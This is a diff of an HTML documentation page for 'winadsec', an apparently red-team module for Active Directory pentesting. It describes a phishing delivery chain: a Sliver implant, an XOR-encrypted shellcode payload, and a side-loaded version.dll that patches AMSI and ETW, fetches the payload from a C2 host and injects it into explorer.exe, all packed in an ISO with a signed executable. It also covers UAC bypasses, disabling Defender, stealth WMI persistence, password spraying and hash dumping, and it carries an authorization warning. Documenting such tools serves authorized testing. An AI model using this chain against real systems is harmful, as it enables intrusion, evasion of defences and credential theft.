-    permission to test. Unauthorized use may violate the CFAA and equivalent computer fraud laws.
-    Always obtain written authorization before any engagement.
-  </div>
-
-  <!-- Quickstart -->
-  <h2 id="quickstart">Quickstart</h2>
-
-  <pre><code><span class="cm"># 1. Load the module</span>
-<span class="hl">use</span> winadsec
-
-<span class="cm"># 2. Unauthenticated DC fingerprint</span>
-<span class="hl">set</span> operation discover
-<span class="hl">run</span> 192.168.1.200
-
-<span class="cm"># 3. Full assessment with credentials</span>
-<span class="hl">set</span> operation auto
-<span class="hl">set</span> domain CORP
-<span class="hl">set</span> username jsmith
-<span class="hl">set</span> password P@ssword1
-<span class="hl">run</span> 192.168.1.200</code></pre>
-
-  <!-- Attack Chain -->
-  <h2 id="chain">Full Attack Chain</h2>
-  <p>End-to-end compromise from unauthenticated discovery to domain-wide credential dump. Each step feeds the next.</p>
-
-  <div class="chain">
-    <div class="chain-step">
-      <div class="chain-num">01</div>
-      <div>
-        <div class="chain-title">gen_sliver — Generate Implant</div>
-        <div class="chain-desc"><code>operation: gen_sliver</code> builds a Windows EXE via <code>sliver-client generate</code> that callbacks to your Sliver server on <code>c2_http_port</code> (default 8443). Garble obfuscation + evasion flags enabled.</div>
-      </div>
+  <!-- Doc Header -->
+  <div class="doc-header">
+    <div class="breadcrumb">
+      <a href="../../../index.html">SecVulnHub</a>
+      <span>/</span>
+      <a href="../index.html">Arsenal</a>
+      <span>/</span>
+      Docs
+      <span>/</span>
+      winadsec
     </div>
-    <div class="chain-step">
-      <div class="chain-num">02</div>
+    <div class="module-meta">
       <div>
-        <div class="chain-title">gen_shellcode — EXE → Shellcode</div>
-        <div class="chain-desc">Runs <code>donut -f 1 -a 2</code> on the EXE to produce position-independent x64 shellcode.</div>
+        <h1 class="module-title">winadsec<span>.</span></h1>
+        <p class="module-sub">Full-chain Windows Active Directory pentest and post-exploitation. Unauthenticated discovery through UAC bypass, reboot-persistent implants, Sliver C2 session management, and end-to-end payload delivery generation — all from one JSON context.</p>
+        <div class="module-tags">
+          <span class="tag hi">secV Module</span>
+          <span class="tag acc">Windows AD</span>
+          <span class="tag warn">Post-Exploitation</span>
+          <span class="tag">Sliver C2</span>
+          <span class="tag">UAC Bypass</span>
+          <span class="tag">Persistence</span>
+          <span class="tag">Python 3</span>
+          <span class="tag">v1.0.0</span>
+        </div>
       </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">03</div>
-      <div>
-        <div class="chain-title">gen_payload — Encrypt Shellcode</div>
-        <div class="chain-desc">XOR-encrypts shellcode with 16-byte key, prepends 4-byte LE length → <code>update.bin</code>. Serve via HTTP: <code>python3 -m http.server 9000</code>.</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">04</div>
-      <div>
-        <div class="chain-title">gen_proxy_dll — Compile version.dll</div>
-        <div class="chain-desc">Zig cross-compiles a transparent <code>version.dll</code> proxy that patches <code>AmsiScanBuffer</code> and <code>EtwEventWrite</code>, downloads + decrypts <code>update.bin</code> via WinHTTP, and injects shellcode into <code>explorer.exe</code> via <code>CreateRemoteThread</code>. Forwards all 16 real exports.</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">05</div>
-      <div>
-        <div class="chain-title">gen_iso — Delivery Package</div>
-        <div class="chain-desc">Bundles malicious <code>version.dll</code> + Microsoft-signed <code>OneDriveSetup.exe</code> into an ISO. User mounts → double-clicks signed EXE → DLL loads → shellcode runs → C2 session. SmartScreen allows the signed EXE; DLL is never directly executed.</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">06</div>
-      <div>
-        <div class="chain-title">Deliver + Wait for Session</div>
-        <div class="chain-desc">Host ISO on HTTP and send the link. After mount and double-click: <code>sliver_sessions</code> to confirm callback, <code>sliver_whoami</code> to verify integrity level.</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">07</div>
-      <div>
-        <div class="chain-title">uac_bypass / lsa_fix — Escalate</div>
-        <div class="chain-desc">Fodhelper HKCU registry hijack elevates payload to high integrity. <code>lsa_fix</code> sets <code>LimitBlankPasswordUse=0</code> to enable blank-password SMB authentication.</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">08</div>
-      <div>
-        <div class="chain-title">persistence — Survive Reboot</div>
-        <div class="chain-desc"><code>wmi_sub</code> installs a WMI EventFilter + CommandLineEventConsumer that fires 60s after boot. Not shown in Autoruns by default. Fallback: <code>run_key</code> (low-priv) or <code>service</code> (admin).</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">09</div>
-      <div>
-        <div class="chain-title">auto — Full AD Assessment</div>
-        <div class="chain-desc">discover → vulncheck → users → groups → shares → passpol → asreproast → kerberoast → bloodhound → privesc_check → lsa_fix → loot</div>
-      </div>
-    </div>
-    <div class="chain-step">
-      <div class="chain-num">10</div>
-      <div>
-        <div class="chain-title">sliver_getsystem + secrets — Domain Compromise</div>
-        <div class="chain-desc">Escalate to SYSTEM, dump SAM/LSA/NTDS hashes via secretsdump. Crack offline with <code>hashcat -m 1000</code> (NTLM) or <code>-m 13100</code> (Kerberoast).</div>
+      <div class="module-stats">
+        <div class="stat-row"><span class="stat-lbl">Category</span><span class="stat-v">Windows / AD</span></div>
+        <div class="stat-row"><span class="stat-lbl">Operations</span><span class="stat-v acc">37</span></div>
+        <div class="stat-row"><span class="stat-lbl">Language</span><span class="stat-v">Python 3</span></div>
+        <div class="stat-row"><span class="stat-lbl">Location</span><span class="stat-v">tools/AD/windows/</span></div>
+        <div class="stat-row"><span class="stat-lbl">Author</span><span class="stat-v">0xb0rn3 | 0xbv1</span></div>
+        <div class="stat-row"><span class="stat-lbl">Version</span><span class="stat-v">1.0.0</span></div>
       </div>
     </div>
   </div>
 
-  <!-- Assessment -->
-  <h2 id="assess">Assessment Operations</h2>
-  <p>Set via <code>set operation &lt;name&gt;</code>. Credential tags indicate requirement level.</p>
+  <!-- Body -->
+  <div class="doc-body">
 
-  <div class="op-grid">
-    <div class="op-card">
-      <div class="op-name">discover <span class="op-badge nocreds">no creds</span></div>
-      <div class="op-desc">Unauthenticated DC fingerprint: TCP ports, SMB null session, LDAP rootDSE, OS, signing, naming contexts, functional level.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">users <span class="op-badge nocreds">optional</span></div>
-      <div class="op-desc">LDAP enum (auth) or SAMR RID brute (null). Returns SIDs, UAC flags, SPNs, preauth status.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">groups <span class="op-badge creds">creds</span></div>
-      <div class="op-desc">LDAP group enum with full member lists. Identifies DA/EA/nested membership.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">shares <span class="op-badge nocreds">optional</span></div>
-      <div class="op-desc">SMB share inventory with READ/WRITE tests and root directory listing.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">passpol <span class="op-badge nocreds">optional</span></div>
-      <div class="op-desc">Domain password policy: lockout threshold, observation window, min length, complexity, history.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">kerberoast <span class="op-badge creds">creds</span></div>
-      <div class="op-desc">Find SPN accounts via LDAP, request TGS. Outputs <code>$krb5tgs$23$</code> hashcat hashes.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">asreproast <span class="op-badge nocreds">no creds</span></div>
-      <div class="op-desc">Probe userlist for DONT_REQUIRE_PREAUTH. Dumps AS-REP hashes — no credentials needed.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">spray <span class="op-badge nocreds">no creds</span></div>
-      <div class="op-desc">Lockout-aware SMB spray. Reads passpol, leaves 2-attempt buffer, skips krbtgt/Admin/Guest.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">vulncheck <span class="op-badge nocreds">no creds</span></div>
-      <div class="op-desc">Zerologon, PetitPotam, NoPac, MachineAccountQuota, AD CS (ESC8), SMBv1, SMB signing.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">bloodhound <span class="op-badge creds">creds</span></div>
-      <div class="op-desc">bloodhound-python collection, BH-compatible JSON zip output for attack path analysis.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">loot <span class="op-badge creds">creds</span></div>
-      <div class="op-desc">Scrape shares for GPP cpassword, unattend.xml, web.config, SSH keys, .kdbx, .env files.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">secrets <span class="op-badge admin">admin</span></div>
-      <div class="op-desc">Dump SAM/LSA/NTDS via impacket-secretsdump. Requires domain admin or local admin.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">exec <span class="op-badge creds">creds</span></div>
-      <div class="op-desc">Remote command via impacket-wmiexec (or native WMI fallback). Output via C$ temp file.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">privesc_check <span class="op-badge creds">creds</span></div>
-      <div class="op-desc">PowerShell privesc audit with AMSI bypass: unquoted services, writable binaries, AIE, UAC config, token privs, stored creds, PATH hijack, elevated autoruns, LimitBlankPasswordUse.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">auto <span class="op-badge nocreds">optional</span></div>
-      <div class="op-desc">Full safe pipeline: discover → vulncheck → users → groups → shares → passpol → asreproast → [kerberoast / bloodhound / privesc_check / lsa_fix if creds provided].</div>
-    </div>
-  </div>
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <ul class="sidebar-nav">
+        <li><div class="sidebar-sep">Overview</div></li>
+        <li><a href="#overview" class="active">What it does</a></li>
+        <li><a href="#quickstart">Quick Start</a></li>
+        <li><div class="sidebar-sep">Operations</div></li>
+        <li><a href="#chain">Attack Chain</a></li>
+        <li><a href="#assess">Assessment</a></li>
+        <li><a href="#postex">Post-Exploitation</a></li>
+        <li><a href="#persist">Persistence</a></li>
+        <li><a href="#sliver">Sliver C2</a></li>
+        <li><a href="#gen">Payload Gen</a></li>
+        <li><div class="sidebar-sep">Reference</div></li>
+        <li><a href="#params">Parameters</a></li>
+        <li><a href="#examples">Examples</a></li>
+        <li><a href="#requirements">Requirements</a></li>
+      </ul>
+    </aside>
 
-  <!-- Post-Exploitation -->
-  <h2 id="postex">Post-Exploitation</h2>
+    <!-- Content -->
+    <div class="content">
 
-  <h3>uac_bypass</h3>
-  <p>
-    Writes a payload command to <code>HKCU\Software\Classes\ms-settings\shell\open\command</code> via
-    PowerShell <code>-EncodedCommand</code> (through WMI exec), then triggers an auto-elevating Windows
-    binary. The elevated process runs the payload at high integrity. Registry is cleaned up automatically.
-  </p>
+      <!-- Overview -->
+      <section id="overview">
+        <p class="sec-label">Overview</p>
+        <h2>What winadsec does</h2>
+        <p><code>winadsec</code> is a full-chain Windows Active Directory pentest and post-exploitation module built for the secV framework. It integrates unauthenticated discovery, credential-based enumeration, lateral movement, UAC bypass, reboot-persistent implants, Sliver C2 session management, and a complete payload delivery pipeline — all driven by a single JSON context from the secV shell.</p>
+        <p>The module spans three major capability areas: <strong>AD assessment</strong> (discover, enumerate, loot), <strong>post-exploitation</strong> (escalate, persist, C2), and <strong>payload generation</strong> (implant → shellcode → DLL → ISO). All output is written to <code>output_dir</code>.</p>
 
-  <div class="table-wrap">
-  <table>
-    <thead><tr><th>uac_method</th><th>Key</th><th>Trigger</th><th>Notes</th></tr></thead>
-    <tbody>
-      <tr><td><code>fodhelper</code></td><td>ms-settings\...command</td><td>fodhelper.exe</td><td>Default. Needs DelegateExecute="". Win10/11.</td></tr>
-      <tr><td><code>eventvwr</code></td><td>mscfile\...command</td><td>eventvwr.exe</td><td>Fallback. No DelegateExecute needed.</td></tr>
-      <tr><td><code>wsreset</code></td><td>AppX82...\Shell\open\command</td><td>wsreset.exe</td><td>UWP path. Newer Win11 builds.</td></tr>
-    </tbody>
-  </table>
-  </div>
+        <div class="feat-grid">
+          <div class="feat-cell">
+            <div class="feat-icon">Assessment</div>
+            <div class="feat-name">15 AD Ops</div>
+            <div class="feat-desc">discover → vulncheck → users → groups → shares → kerberoast → asreproast → bloodhound → loot → secrets.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Escalation</div>
+            <div class="feat-name">UAC Bypass</div>
+            <div class="feat-desc">fodhelper, eventvwr, and wsreset HKCU hijack methods. Payload options: lsa_fix, add_admin, disable_defender, enable_rdp.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Implant</div>
+            <div class="feat-name">Persistence</div>
+            <div class="feat-desc">6 mechanisms: run_key, startup_folder, scheduled_task, service, wmi_sub (stealth), all_user. All survive reboot.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">C2</div>
+            <div class="feat-name">Sliver Bridge</div>
+            <div class="feat-desc">12 Sliver C2 ops: sessions, exec, upload, download, spawndll, getsystem, impersonate, registry, screenshot.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Delivery</div>
+            <div class="feat-name">Payload Chain</div>
+            <div class="feat-desc">gen_sliver → gen_shellcode → gen_payload (XOR) → gen_proxy_dll (Zig) → gen_iso (signed + DLL bundle).</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Pipeline</div>
+            <div class="feat-name">auto mode</div>
+            <div class="feat-desc">Full safe AD assessment in one command. Adapts depth to whether credentials are provided.</div>
+          </div>
+        </div>
 
-  <div class="table-wrap">
-  <table>
-    <thead><tr><th>uac_payload</th><th>Effect</th></tr></thead>
-    <tbody>
-      <tr><td><code>lsa_fix</code></td><td>Set HKLM LimitBlankPasswordUse=0 (fixes blank-password SMB auth)</td></tr>
-      <tr><td><code>add_admin</code></td><td>Add current user to local Administrators group</td></tr>
-      <tr><td><code>disable_defender</code></td><td>Set-MpPreference -DisableRealtimeMonitoring $true</td></tr>
-      <tr><td><code>enable_rdp</code></td><td>Set fDenyTSConnections=0 in HKLM (enable RDP)</td></tr>
-    </tbody>
-  </table>
-  </div>
+        <div class="callout crit">
+          <span class="callout-mark">!</span>
+          <strong>AUTHORIZATION REQUIRED.</strong> Only run against systems you own or have explicit written permission to test. Unauthorized use may violate the CFAA and equivalent computer fraud laws.
+        </div>
+      </section>
 
-  <h3>lsa_fix</h3>
-  <p>
-    Shortcut for <code>uac_bypass</code> with <code>uac_payload=lsa_fix</code>.
-    Disables <code>LimitBlankPasswordUse</code> via UAC-elevated <code>reg.exe</code>.
-    Verifies the write succeeded and returns <code>bypassed: true/false</code>.
-  </p>
+      <!-- Quick Start -->
+      <section id="quickstart">
+        <p class="sec-label">Quick Start</p>
+        <h2>Running winadsec</h2>
+        <p>winadsec reads JSON from stdin and writes JSON to stdout. The input structure takes a <code>target</code> (DC IP) and a <code>params</code> object with <code>operation</code> plus any required inputs.</p>
 
-  <!-- Persistence -->
-  <h2 id="persist">Persistence</h2>
-  <p>
-    All methods survive reboot and shutdown. Install with <code>operation: persistence</code>,
-    remove with <code>remove: true</code>. Use <code>persist_name</code> to blend in
-    (e.g. <code>WindowsSecurityHealth</code>, <code>MicrosoftUpdateHelper</code>).
-  </p>
+        <pre><code><span class="comment"># 1. Load the module in secV shell</span>
+<span class="kw">use</span> winadsec
 
-  <div class="table-wrap">
-  <table>
-    <thead><tr><th>persist_method</th><th>Privilege</th><th>Trigger</th><th>Stealth</th><th>Notes</th></tr></thead>
-    <tbody>
-      <tr>
-        <td><code>run_key</code></td>
-        <td><span class="sev sev-info">low-priv</span></td>
-        <td>User logon</td>
-        <td>★★☆</td>
-        <td>HKCU\...\Run. Visible in Autoruns. Default fallback.</td>
-      </tr>
-      <tr>
-        <td><code>startup_folder</code></td>
-        <td><span class="sev sev-info">low-priv</span></td>
-        <td>User logon</td>
-        <td>★☆☆</td>
-        <td>Copies EXE to user Startup folder. Very visible.</td>
-      </tr>
-      <tr>
-        <td><code>scheduled_task</code></td>
-        <td><span class="sev sev-info">low-priv</span></td>
-        <td>On logon</td>
-        <td>★★☆</td>
-        <td>schtasks /sc onlogon. Task Scheduler visible.</td>
-      </tr>
-      <tr>
-        <td><code>service</code></td>
-        <td><span class="sev sev-high">admin</span></td>
-        <td>Boot (before logon)</td>
-        <td>★★☆</td>
-        <td>Auto-start service. Fires before any user logs in.</td>
-      </tr>
-      <tr>
-        <td><code>wmi_sub</code></td>
-        <td><span class="sev sev-high">admin</span></td>
-        <td>~60s after boot</td>
-        <td><strong>★★★</strong></td>
-        <td>WMI EventFilter + CommandLineEventConsumer. Not in Autoruns. Hardest to detect.</td>
-      </tr>
-      <tr>
-        <td><code>all_user</code></td>
-        <td><span class="sev sev-high">admin</span></td>
-        <td>Any user logon</td>
-        <td>★★☆</td>
-        <td>HKLM\...\Run. Fires for every user that logs in.</td>
-      </tr>
-    </tbody>
-  </table>
-  </div>
+<span class="comment"># 2. Unauthenticated DC fingerprint</span>
+<span class="kw">set</span> operation discover
+<span class="kw">run</span> 192.168.1.200
 
-  <!-- Sliver C2 -->
-  <h2 id="sliver">Sliver C2 Bridge</h2>
-  <p>
-    All Sliver ops use the installed <code>sliver-client</code> binary with the operator config
-    auto-loaded from <code>~/.sliver-client/configs/</code>. Single-command ops use
-    <code>implant -s SESSION_ID</code>; multi-step ops use RC script files with <code>console --rc</code>.
-  </p>
+<span class="comment"># 3. Full assessment with credentials</span>
+<span class="kw">set</span> operation auto
+<span class="kw">set</span> domain CORP
+<span class="kw">set</span> username jsmith
+<span class="kw">set</span> password P@ssword1
+<span class="kw">run</span> 192.168.1.200
 
-  <div class="op-grid">
-    <div class="op-card">
-      <div class="op-name">sliver_sessions</div>
-      <div class="op-desc">List all active sessions: ID, name, transport, remote addr, hostname, username.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_exec</div>
-      <div class="op-desc">Execute shell command via <code>cmd.exe /Q /c</code>. Returns stdout + stderr.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_upload</div>
-      <div class="op-desc">Upload local file to remote path. Deliver payloads, scripts, and tools.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_download</div>
-      <div class="op-desc">Download remote file to local path. Exfiltrate loot, creds, configs.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_ps</div>
-      <div class="op-desc">List remote processes with PID, PPID, name, owner. Identify injection targets.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_spawndll</div>
-      <div class="op-desc">Reflective DLL injection into target PID. Used for UAC bypass DLL delivery.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_getsystem</div>
-      <div class="op-desc">Escalate to NT AUTHORITY\SYSTEM via Sliver built-in. Requires high-integrity session.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_registry</div>
-      <div class="op-desc">Read/write Windows registry. Omit <code>reg_value</code> to read; provide it to write.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_whoami</div>
-      <div class="op-desc">Return current user + integrity level via whoami.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_screenshot</div>
-      <div class="op-desc">Capture desktop screenshot, save to <code>output_dir</code>.</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_impersonate</div>
-      <div class="op-desc">Steal token of a logged-in user. Requires SeDebugPrivilege (high-integrity).</div>
-    </div>
-    <div class="op-card">
-      <div class="op-name">sliver_make_token</div>
-      <div class="op-desc">Create logon session with given creds without spawning new process (PtH-compatible).</div>
-    </div>
-  </div>
+<span class="comment"># 4. Direct JSON (outside secV shell)</span>
+echo '{
+  "target": "192.168.1.200",
+  "params": {
+    "operation": "auto",
+    "domain": "CORP",
+    "username": "jsmith",
+    "password": "P@ssword1",
+    "output_dir": "./loot"
+  }
+}' | python3 winadsec.py</code></pre>
 
-  <!-- Payload Generation -->
-  <h2 id="gen">Payload Generation</h2>
+        <div class="callout info">
+          <span class="callout-mark">ℹ</span>
+          Most assessment ops work without credentials (null session, RID brute, AS-REP). Providing creds unlocks LDAP enumeration, Kerberoasting, BloodHound collection, and secretsdump.
+        </div>
+      </section>
 
-  <div class="table-wrap">
-  <table>
-    <thead><tr><th>Operation</th><th>Tool</th><th>Output</th></tr></thead>
-    <tbody>
-      <tr><td><code>gen_sliver</code></td><td>sliver-client generate</td><td>WinUpdate.exe (Sliver HTTP implant, evasion on)</td></tr>
-      <tr><td><code>gen_shellcode</code></td><td>donut -f 1 -a 2</td><td>implant.bin (raw x64 shellcode)</td></tr>
-      <tr><td><code>gen_payload</code></td><td>Python XOR + struct.pack</td><td>update.bin (4-byte LE len + XOR ciphertext)</td></tr>
-      <tr><td><code>gen_proxy_dll</code></td><td>zig cc -target x86_64-windows-gnu</td><td>version.dll (proxy + AMSI/ETW patch + WinHTTP loader)</td></tr>
-      <tr><td><code>gen_uac_dll</code></td><td>zig cc -target x86_64-windows-gnu</td><td>uacbypass.dll (fodhelper + COM IShellDispatch2)</td></tr>
-      <tr><td><code>gen_iso</code></td><td>xorriso -as mkisofs</td><td>OneDriveUpdate.iso (signed EXE + malicious DLL)</td></tr>
-      <tr><td><code>gen_all</code></td><td>all of the above</td><td>Full delivery package in <code>output_dir</code></td></tr>
-    </tbody>
-  </table>
-  </div>
+      <!-- Attack Chain -->
+      <section id="chain">
+        <p class="sec-label">Operations</p>
+        <h2>Full attack chain</h2>
+        <p>End-to-end compromise from unauthenticated discovery to domain-wide credential dump. Each step feeds the next through the shared <code>output_dir</code>.</p>
 
-  <h3>XOR Key</h3>
-  <p>Default key (hex): <code>4e3a7f1289abcdef0123456789fedcba</code>. Override with the <code>xor_key</code> parameter. The proxy DLL and <code>update.bin</code> must use the same key.</p>
+        <div class="chain">
+          <div class="chain-step">
+            <div class="chain-num">01</div>
+            <div>
+              <div class="chain-title">gen_sliver — Generate Implant</div>
+              <div class="chain-desc"><code>operation: gen_sliver</code> builds a Windows EXE via <code>sliver-client generate</code> that callbacks to your Sliver server on <code>c2_http_port</code> (default 8443). Garble obfuscation + evasion flags enabled. Output: <code>WinUpdate.exe</code>.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">02</div>
+            <div>
+              <div class="chain-title">gen_shellcode — EXE → Shellcode</div>
+              <div class="chain-desc">Runs <code>donut -f 1 -a 2</code> on the generated EXE to produce position-independent x64 shellcode (<code>implant.bin</code>).</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">03</div>
+            <div>
+              <div class="chain-title">gen_payload — Encrypt Shellcode</div>
+              <div class="chain-desc">XOR-encrypts shellcode with a 16-byte key, prepends a 4-byte LE length header → <code>update.bin</code>. Serve via <code>python3 -m http.server 9000</code> from <code>output_dir</code>.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">04</div>
+            <div>
+              <div class="chain-title">gen_proxy_dll — Compile version.dll</div>
+              <div class="chain-desc">Zig cross-compiles a transparent <code>version.dll</code> proxy that patches <code>AmsiScanBuffer</code> and <code>EtwEventWrite</code> in-process, downloads + decrypts <code>update.bin</code> via WinHTTP, and injects shellcode into <code>explorer.exe</code> via <code>CreateRemoteThread</code>. Forwards all 17 real exports.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">05</div>
+            <div>
+              <div class="chain-title">gen_iso — Delivery Package</div>
+              <div class="chain-desc">Bundles malicious <code>version.dll</code> + a Microsoft-signed <code>OneDriveSetup.exe</code> into an ISO. User mounts → double-clicks the signed EXE → DLL side-loads → shellcode runs → C2 session. SmartScreen allows the signed EXE; the DLL is never directly executed.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">06</div>
+            <div>
+              <div class="chain-title">Deliver + Wait for Session</div>
+              <div class="chain-desc">Host ISO on HTTP and send the link. After mount and double-click: run <code>sliver_sessions</code> to confirm callback, <code>sliver_whoami</code> to verify integrity level.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">07</div>
+            <div>
+              <div class="chain-title">uac_bypass / lsa_fix — Escalate</div>
+              <div class="chain-desc">Fodhelper HKCU registry hijack elevates the payload to high integrity. <code>lsa_fix</code> sets <code>LimitBlankPasswordUse=0</code> to enable blank-password SMB authentication for further lateral movement.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">08</div>
+            <div>
+              <div class="chain-title">persistence — Survive Reboot</div>
+              <div class="chain-desc"><code>wmi_sub</code> installs a WMI EventFilter + CommandLineEventConsumer that fires ~60s after boot. Not visible in Autoruns by default. Fallback: <code>run_key</code> (low-priv) or <code>service</code> (admin).</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">09</div>
+            <div>
+              <div class="chain-title">auto — Full AD Assessment</div>
+              <div class="chain-desc">discover → vulncheck → users → groups → shares → passpol → asreproast → kerberoast → bloodhound → privesc_check → lsa_fix → loot. All ops run in sequence; cred-required steps are skipped if no creds provided.</div>
+            </div>
+          </div>
+          <div class="chain-step">
+            <div class="chain-num">10</div>
+            <div>
+              <div class="chain-title">sliver_getsystem + secrets — Domain Compromise</div>
+              <div class="chain-desc">Escalate to NT AUTHORITY\SYSTEM, then dump SAM/LSA/NTDS hashes via <code>impacket-secretsdump</code>. Crack offline with <code>hashcat -m 1000</code> (NTLM) or <code>-m 13100</code> (Kerberoast).</div>
+            </div>
+          </div>
+        </div>
+      </section>
 
-  <h3>Proxy DLL internals</h3>
-  <p>
-    On <code>DLL_PROCESS_ATTACH</code>: loads real <code>System32\version.dll</code>, resolves all 16 exports,
-    spawns <code>payload_thread</code>. Thread patches <code>AmsiScanBuffer</code> and <code>EtwEventWrite</code> in-process,
-    opens a WinHTTP connection to <code>C2_HOST:C2_PORT/C2_PATH</code>, reads the XOR-encrypted <code>update.bin</code>,
-    decrypts it, and calls <code>VirtualAllocEx + WriteProcessMemory + CreateRemoteThread</code> on <code>explorer.exe</code>.
-    Shellcode survives host-process exit since it runs inside explorer.
-  </p>
+      <!-- Assessment -->
+      <section id="assess">
+        <p class="sec-label">Operations</p>
+        <h2>Assessment operations</h2>
+        <p>Set via <code>set operation &lt;name&gt;</code> in the secV shell or <code>"operation": "name"</code> in JSON. Credential tags show requirement level.</p>
 
-  <!-- Examples -->
-  <h2 id="examples">Examples</h2>
+        <div class="mode-grid">
+          <div class="mode-card">
+            <div class="mode-key">discover <span class="mode-badge nocreds">no creds</span></div>
+            <div class="mode-desc">Unauthenticated DC fingerprint: TCP ports, SMB null session, LDAP rootDSE, OS banner, signing status, naming contexts, forest/domain functional level.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">users <span class="mode-badge nocreds">optional</span></div>
+            <div class="mode-desc">LDAP enum with creds, or SAMR RID brute without. Returns SIDs, UAC flags, SPNs, preauth status, logon times.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">groups <span class="mode-badge creds">creds</span></div>
+            <div class="mode-desc">LDAP group enum with full member lists. Identifies DA/EA/nested membership chains.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">shares <span class="mode-badge nocreds">optional</span></div>
+            <div class="mode-desc">SMB share inventory with READ/WRITE permission tests and root directory listing on accessible shares.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">passpol <span class="mode-badge nocreds">optional</span></div>
+            <div class="mode-desc">Domain password policy: lockout threshold, observation window, min length, complexity, max age, history count.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">kerberoast <span class="mode-badge creds">creds</span></div>
+            <div class="mode-desc">Find SPN accounts via LDAP, request TGS tickets. Outputs <code>$krb5tgs$23$</code> hashcat-compatible hashes to <code>output_dir</code>.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">asreproast <span class="mode-badge nocreds">no creds</span></div>
+            <div class="mode-desc">Probe userlist for <code>DONT_REQUIRE_PREAUTH</code>. Dumps AS-REP hashes — no credentials needed. Crack with <code>hashcat -m 18200</code>.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">spray <span class="mode-badge nocreds">no creds</span></div>
+            <div class="mode-desc">Lockout-aware SMB password spray. Reads passpol, leaves a 2-attempt buffer, skips krbtgt/Admin/Guest automatically.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">vulncheck <span class="mode-badge nocreds">no creds</span></div>
+            <div class="mode-desc">Zerologon, PetitPotam, NoPac, MachineAccountQuota, AD CS ESC8, SMBv1, SMB signing disabled. All unauthenticated.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">bloodhound <span class="mode-badge creds">creds</span></div>
+            <div class="mode-desc">bloodhound-python collection, outputs BH-compatible JSON zip for attack path analysis in BloodHound CE.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">loot <span class="mode-badge creds">creds</span></div>
+            <div class="mode-desc">Scrape shares for GPP cpassword, unattend.xml, web.config, SSH keys, .kdbx, .env, and credentials.xml files.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">secrets <span class="mode-badge admin">admin</span></div>
+            <div class="mode-desc">Dump SAM/LSA/NTDS via impacket-secretsdump. Requires domain admin or local admin + PtH supported via <code>hash</code> param.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">exec <span class="mode-badge creds">creds</span></div>
+            <div class="mode-desc">Remote command execution via impacket-wmiexec. Returns stdout + stderr via C$ temp file. Supports PtH.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">privesc_check <span class="mode-badge creds">creds</span></div>
+            <div class="mode-desc">PowerShell privesc audit with AMSI bypass: unquoted services, writable binaries, AIE, UAC config, stored creds, PATH hijack, elevated autoruns.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">auto <span class="mode-badge nocreds">optional</span></div>
+            <div class="mode-desc">Full safe pipeline. Runs all safe ops; adds kerberoast, bloodhound, privesc_check, lsa_fix if credentials are provided.</div>
+          </div>
+        </div>
+      </section>
 
-  <h3>Full gen_all</h3>
-  <pre><code>echo '{
+      <!-- Post-Exploitation -->
+      <section id="postex">
+        <p class="sec-label">Operations</p>
